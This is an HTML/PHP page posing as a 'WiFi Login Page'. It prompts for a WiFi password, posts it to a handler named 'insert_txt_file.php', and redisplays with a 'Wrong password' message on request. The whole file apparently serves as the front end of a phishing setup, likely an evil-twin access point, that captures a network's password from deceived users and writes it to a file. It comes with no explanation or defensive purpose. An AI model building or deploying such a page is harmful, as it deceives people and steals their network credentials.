<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<link rel="stylesheet" type="text/css" href="style/style.css">
	<title> WiFi Login Page </title>
</head>
<body>

<div class="container">

		<form action="insert_txt_file.php" method="post">
			<?php 
			if (isset($_GET["incorrect"]) && $_GET["incorrect"] == 'true') {
			echo "<div class=\"incorrect\"> Wrong password, try again !</div>";
			}
			else{
				echo "<div>Enter WiFi password:</div>";
			}
			?>
			<input type="password" name="pass" class="pass"/> <br><br>
			<input type="submit" value="Login" class="submit" name="log_in" onclick="myfunction()"/>
		</form>
</div>
</body>
</html>